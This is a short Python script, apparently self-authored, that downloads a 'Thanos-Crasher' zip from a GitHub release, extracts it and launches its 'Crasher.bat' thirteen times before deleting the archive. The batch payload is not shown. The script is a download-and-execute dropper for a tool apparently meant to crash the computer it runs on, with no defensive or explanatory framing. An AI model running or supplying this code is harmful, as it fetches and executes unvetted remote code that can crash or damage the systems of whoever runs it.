# by me

import requests
import zipfile
import os

url = "https://github.com/DARKNOSY/Thanos-Crasher/releases/download/V0.5/Thanos-Crasher.zip"
response = requests.get(url)
zip_file_path = "Thanos-Crasher.zip"
with open(zip_file_path, "wb") as zip_file:
    zip_file.write(response.content)

extraction_path = "Thanos-Crasher"
with zipfile.ZipFile(zip_file_path, "r") as zip_ref:
    zip_ref.extractall(extraction_path)

os.chdir(extraction_path)
os.chdir("Thanos")
for _ in range(13):
    os.startfile("Crasher.bat")

print("Thanos Crasher executed successfully.")

os.remove(zip_file_path)
